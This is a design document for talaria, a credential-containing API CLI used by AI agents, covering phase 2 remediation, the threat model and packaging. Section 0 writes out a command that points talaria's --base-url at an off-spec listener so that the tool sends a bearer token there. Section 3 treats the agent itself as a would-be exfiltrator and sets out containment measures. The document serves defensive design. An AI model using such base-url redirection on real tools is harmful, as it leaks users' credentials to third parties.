# talaria — Phase 2 design: credential containment, then distribution

*Status: design · drafted 2026-08-02 · **revised 2026-08-03** against the completed build ·
successor to [DESIGN.md](../design/DESIGN.md) v0.4*

> **Three of the §6 amendments were applied on 2026-08-03 as DESIGN.md v0.5** — the emitted-curl
> body rule, the cache policy, and the replay table — because phase 2a *implements* them, and a
> spec-compliance reviewer reading unamended text would flag the fixes as drift. The `run`
> removal landed with them. The remaining six are 2b work and stay fenced until 2a completes.

## 0. What changed in the 2026-08-03 revision

The first draft was written while the build was still running. It is now wrong in one important
way and stale in several small ones.

**The threat model was incomplete.** The draft designed the boundary entirely around *"can the
agent read the secret?"* — hence uid separation and an owned-by-caller file guard. The review loop
found a sharper attack the draft never considered: **the agent does not need to read the secret,
it makes talaria send it.**

```
talaria call spec.yaml listPets --base-url http://127.0.0.1:8765
```

Reproduced by the reviewer: `Authorization: Bearer SUPERSECRET` delivered to an off-spec listener,
exit 0, no warning. Uid separation does nothing against this — the agent may still pass any
`--base-url`. See §3.

Also corrected: `--fixtures dir/` is a fourth path-taking surface the draft missed; the claim
"no rework of Tasks 1–33 is implied" is false; and the amendment ledger has been rebased onto
DESIGN.md v0.4, which the build amended in flight.

## 1. Where the build actually landed

All 33 tasks of [IMPLEMENTATION_PLAN.md](../../IMPLEMENTATION_PLAN.md) completed, 15 packages,
`go test ./...` green, `AGENT.md` shipped. Merged to `main` as `3a672e1`.

Two things happened that the plan did not anticipate:

1. **DESIGN.md was amended to v0.4 mid-build** (`58af63c`), adding the *credentials bind to hosts*
   invariant and the *history is untrusted input on read* rule.
2. **A review loop produced 32 findings — 8 CRIT — and escalated to a human** rather than
   converging. The findings are in [REVIEW_FINDINGS.md](../../REVIEW_FINDINGS.md); each names a
   file, a line, and an empirical reproduction. They are not speculative.

**The design is ahead of the code.** v0.4's host-binding invariant is entirely unimplemented —
`grep -rn "allow-host\|allow_hosts\|credentials_withheld\|AllowHost" --include=*.go .` returns
zero hits. The build finished before the amendment that governs it.

`go test ./...` is green, so nothing below is caught by the existing suite.

## 2. What phase 2 is

Two unlike bodies of work, in order:

- **2a — remediation.** Close the credential-containment holes the review found. The build
  escalated rather than finished; this finishes it.
- **2b — the boundary and distribution.** Uid separation, the read-primitive guard, `doctor`,
  packaging, the Claude Code skill, and real-spec dogfooding.

2a precedes 2b because 2b's deliverable is *installing talaria into your own agent sessions*, and
doing that first would install a tool with a verified credential-exfiltration hole.

The ordering after phase 2 is unchanged: **deepen the CLI → the twin.** The twin (roadmap 5–8)
stays behind the §7 gate.

### 2.1 Scope reduction: `run` is cut

**Executed 2026-08-03** (`21 files changed, 17 insertions(+), 3821 deletions(-)`). Production
lines 10,752 → 9,159; test lines 15,498 → 13,421.

**Decision: remove `talaria run`, `internal/gen`, fixtures and the JUnit report before 2a begins.**

Measured cost of keeping it: 3,539 lines directly (`cmd/talaria/run.go` + test 1,498,
`internal/gen` 1,659, `internal/output/junit.go` + test 382), plus knock-on in the canary stages,
the e2e flows and the docs — call it ~4,200. `internal/gen` is imported only by `run.go`, so the
cut is clean.

It is the least differentiated thing in the tool. Schemathesis, Hurl and newman all do
spec-driven smoke testing, and §2 concedes it. `call`, `history` and the spec commands are the
part nothing else does.

Cutting *before* 2a rather than after: findings 7 and 12 are entirely inside `gen` and vanish;
findings 4, 8, 16 and 19 shrink to their non-`run` halves. Hardening code that is about to be
deleted is waste.

Two simplifications fall out:

- **`corpus.SourceRun` goes**, leaving `call` and `replay`. Retention stays per-source: an
  earlier draft of this section claimed the per-source cap loses its justification with `run`
  gone, but `history replay` is also a burst producer, so the rule that one source cannot evict
  another still earns its keep. Corrected after looking at the code rather than the doc.
- **`--fixtures` disappears**, taking phase 2b's fileguard from four call sites to three.

**Honest limit of this cut.** It removes ~15% of production lines. It does not address the two
larger volume problems in §2.2 — the size of the command layer and a test suite that is 2.4× the
production code while catching none of the 32 findings. Cutting `run` is worth doing; it is not
the answer to "why is this so big."

### 2.2 Why the codebase is the size it is

Measured **before the §2.1 cut**, since these numbers are what explain how the shape arose:
**6,496 lines of actual production code**
(non-comment, non-blank), carrying 2,777 comment lines, 1,479 blanks, 15,498 test lines, 2,387
lines of testdata and 2,520 of markdown. Twelve non-test packages at ~430 lines each. For the
feature set, 6.5k is not bloated and the package split is not over-fragmented.

Three things are wrong, and none of them is the line count:

1. **The tests are voluminous and shallow.** 15,498 lines, 2.4× production, green with all 32
   findings present. They did not catch credential exfiltration via `--base-url`, header
   injection, an unredacted body on stdout, the OOM or invalid TSV. The cause is structural: each
   of the 33 tasks specified 5–8 "Red — write failing tests" assertions *in advance*, so the suite
   **encodes the plan's intentions, not an attacker's**. Four adversarial reviewers in one pass
   found more than 15k lines of tests did.
2. **The command layer is the largest single component.** `cmd/talaria` holds 28% of production
   code (1,589 of 5,511 non-comment lines) with 12 view structs spread across it and
   `history.go` at 762 lines. A CLI layer should be thin wiring over packages; `replayRequest`
   living in `cmd/` is why finding 3 exists. (An earlier draft said 47%, dividing `cmd/`'s raw
   line count by the project's code-only count — an invalid comparison.)
3. **30% of non-blank production lines are comments**, and several assert invariants the code does
   not hold (findings 19, 29, 30, 31).

**Root cause: a fresh-context loop can only add.** Context cannot carry intent between iterations,
so tests must be specified up front; cannot carry rationale, so comments are heavy; cannot see the
whole, so no task refactors across boundaries and each command grows its own view types. Thirty-
three additive tasks with no compaction phase is exactly how this shape arises. **The missing step
is a compaction pass, not a different coding standard.**

## 3. The threat model, corrected

Three claims, not two. The first draft had A and B; the review established that A alone is not
what "the credential firewall" means.

| | Claim | Guaranteeable by talaria? | Status |
|---|---|---|---|
| **A** | talaria never *emits* a credential value — stdout, stderr, dry-run, emitted curl, errors, history | **Yes**, mechanically | Shipped, with two holes (findings 6, 22) |
| **A′** | talaria never *transmits* a credential to a host the spec does not declare | **Yes**, mechanically | **Designed in v0.4, entirely unbuilt** |
| **B** | the agent cannot *obtain* the credential by other means | **No** — a property of the OS | Not started; §6 |

**A′ is the one that matters most and the one the draft missed.** Transmitting a credential to an
attacker is strictly worse than printing it, and the canary suite cannot catch it: redaction
answers *does it print*, not *who receives it*. A′ is also cheap — it is a host-set check, not a
deployment change — where B requires uid separation the user must set up.

**Findings 1, 2, 3 and 22 are one rule seen through four doors:**

> The destination of a request, and the credentials attached to it, are derived from the spec and
> the flags — never from stored or off-spec input.

Fix it once and all four close: replay re-derives through `index.Lookup` → `request.Build` →
`config.Resolve`, and host binding gates the credential at the point of attachment.

## 4. Decisions

### 4.1 Replay re-derives; `replayableEnv` is deleted (finding 18)

Finding 18 is a documented contradiction — §5a restricts replay to the `TALARIA_AUTH_*` namespace
while §5, `AGENT.md:249` and `README.md:263` all permit a profile's `auth:` map to name an
arbitrary variable. The reviewer could not pick and escalated.

**Decision: neither. The question is dissolved by fixing finding 3.** Once replay re-resolves
credentials through `config.Resolve` rather than reading refs off the stored entry, there is no
"resolvable env-var set" for stored entries at all. `replayableEnv` (`cmd/talaria/history.go:733`)
becomes dead code and is deleted. No doc amendment is needed because no code implements the
contested rule any more.

Verification is part of the fix: assert the symbol is gone, not that it is unreachable.

### 4.2 Spec cache: 24h TTL, conditional revalidation, `--refresh` (finding 25)

**Decision:** store `ETag`/`Last-Modified` alongside each cache entry. Inside 24 hours, serve from
cache with no network. Past it, revalidate with `If-None-Match`/`If-Modified-Since` — cheap when
unchanged, and a 304 refreshes the timestamp without a re-download. `--refresh` forces a fetch.

Rejected: revalidating on every use (a network round trip in front of every `list`/`describe`
contradicts §4's "cheap, no network beyond fetching the spec" and breaks offline use); and a
bypass flag alone (leaves staleness unbounded and silent, which is what makes `validate` report
violations the server never committed).

Needs a §4 clause and a `--refresh` flag. `doctor` reports the cache directory and its age.

### 4.3 Emitted curl references the body source rather than inlining it (finding 6)

The JSON `request.body` field gets redacted unconditionally — `internal/corpus/entry.go:242`
already runs request bodies through the response body-path redactor and `callView` does not, which
is the firewall backwards. The tension the reviewer flagged is that a redacted body makes the
emitted curl non-runnable, breaking §3.4's "portable reproduction" promise.

**Decision: emitted curl references the source instead of inlining the content.**

| Body source | Emitted curl |
|---|---|
| `--body @file` | `--data @file` |
| `--body -` | `--data @-` |
| argv literal | inlined — the agent supplied it, so nothing is disclosed |

Runnable *and* leak-free. It is the same symbolic substitution already used for
`$TALARIA_AUTH_BEARER`, applied to bodies: reference the thing, never the value.

## 5. The phases, cut loose

Each phase below is a **self-contained design document sized for one `ralph-implement` run.**
Feed them one at a time.

> **Do not feed *this* document to a loop.** It is the rationale and the record: the threat
> model, the decisions and their rejected alternatives, and why the codebase has the shape it
> has. The planning phase would read it as scope and build three phases at once.

| Phase | Document | Scope | Depends on |
|---|---|---|---|
| **2a** | [`2026-08-03-phase-2a-remediation.md`](2026-08-03-phase-2a-remediation.md) | 25 review findings: host binding, replay re-derivation, unsupported schemes, header injection, the unredacted body, the hang set, history integrity, the canary gate's own holes | the `cleanup` branch |
| **2b** | [`2026-08-03-phase-2b-boundary.md`](2026-08-03-phase-2b-boundary.md) | `internal/boundary`, `internal/fileguard`, `talaria doctor`, exit code 6, the documented uid-separated deployment | 2a merged |
| **2c** | [`2026-08-03-phase-2c-distribution.md`](2026-08-03-phase-2c-distribution.md) | Version stamping, `make install`, `v0.1.0`, the Claude Code skill, and the dogfooding findings document | 2b merged |

The ordering is load-bearing. 2b installs talaria into live agent sessions by way of 2c, so
running either before 2a would deploy a tool with a verified credential-exfiltration hole. 2c's
findings document is what answers the §7 twin gate.

Findings 7, 12 and 26 were made moot by deletions on the `cleanup` branch. Findings 27, 28 and
32 are deferred, with reasons, in 2a's document; 32 is picked up by 2c's dogfooding.


## 6. Pending DESIGN.md amendments

**The six below are applied by phase 2b**, which carries its own copy of this table. Three
others were applied ahead of 2a as v0.5 (emitted-curl body, cache policy, replay table) along
with the `run` removal, because 2a *implements* them.

| § | Amendment |
|---|---|
| §1, §3.0 | Split claims A / A′ / B (§3 above). State which the code delivers and which needs the enforced deployment. "Secrets never reach the agent" becomes three sentences, not one |
| ~~§3.4~~ | **Applied in v0.5.** Emitted curl references the body source rather than inlining it (§4.3) |
| §4 | Add `talaria doctor [--require enforced]`; add exit code **6 — boundary requirement not satisfied** (verified still unused in v0.5). ~~Cache TTL/revalidation/`--refresh`~~ **applied in v0.5** |
| §5 | Add `internal/boundary` and `internal/fileguard` |
| §5a | New leak-channel row: path-taking flags as arbitrary-file-read primitives under privilege separation; countermeasure is the ownership rule. Four call sites named |
| ~~§5a replay table~~ | **Applied in v0.5.** Replay resolves nothing from stored entries, so the namespace row has no code to govern (§4.1) |
| §5a threats not covered | Rewrite: enforced mode moves *out*. Record the rejected designs of §6.1 with reasons so they are not re-proposed |
| ~~§4, §5, §5a, §7~~ | **Applied in v0.5.** `run` removed from the CLI surface, `internal/gen` from the package list, the "Test data" subsection dropped, roadmap Phase 4 struck. Exit code 4 keeps its `--fail-on-error` half |
| §7 | Insert phase 2 between 4 and 5; note it absorbs the self-install slice of the distribution line |
| §8 | Add macOS: Keychain per-binary ACLs are a stronger mechanism with no Linux equivalent |

## 7. Deferred, tracked

- **macOS.** Keychain ACLs scope to a code-signed binary rather than a uid — a genuine boundary
  without uid separation. No Linux equivalent. Unsolved.
- **Secrets in response bodies.** §5a's standing gap. Mitigated by default `Set-Cookie` redaction
  and configurable body paths; not solved.
- **Installing the boundary.** talaria documents and verifies the uid-separated deployment; it does
  not create the user, the sudoers entry, or the units. A `talaria install-boundary` is possible
  later.
- **Rejected designs** (§6.1) — same-uid broker, broker + setgid, uid-scoped keyrings.
- **Findings 27, 28 and 32** — deferred with reasons in 2a's document. 32 is picked up by 2c's
  dogfooding, where real Swagger 2.0 specs appear. 12 and 26 are moot.
- **Public distribution** — release matrix, install script, Homebrew tap, pi package.

## 8. Successor phases

1. **Deepen the CLI** — driven by the 2c findings doc. Candidates: request chaining via OpenAPI
   `links`, search ranking, spec overlays. DESIGN.md §9 lists several as non-goals; the findings decide
   whether that stance survives contact.
2. **The twin** — roadmap 5–8, still behind the §7 gate.
